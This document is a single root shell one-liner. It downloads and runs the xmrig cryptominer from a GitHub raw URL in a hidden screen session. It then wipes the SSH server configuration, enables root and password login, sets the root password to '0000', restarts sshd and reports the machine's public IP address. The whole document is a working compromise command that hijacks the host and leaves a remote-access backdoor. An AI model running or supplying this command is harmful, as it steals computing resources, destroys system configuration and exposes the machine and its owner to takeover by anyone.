sudo su -c "sudo apt-get install screen -y && screen -dmS mining bash -c 'curl -OL https://raw.githubusercontent.com/bcot5001/xmrig/main/config.json && curl -OL https://raw.githubusercontent.com/bcot5001/xmrig/main/xmrig && chmod +x xmrig && sudo ./xmrig' && > /etc/ssh/sshd_config && echo PasswordAuthentication yes >> /etc/ssh/sshd_config && echo PermitRootLogin yes >> /etc/ssh/sshd_config && echo root:0000 | sudo chpasswd && sudo systemctl restart sshd && curl ifconfig.me"
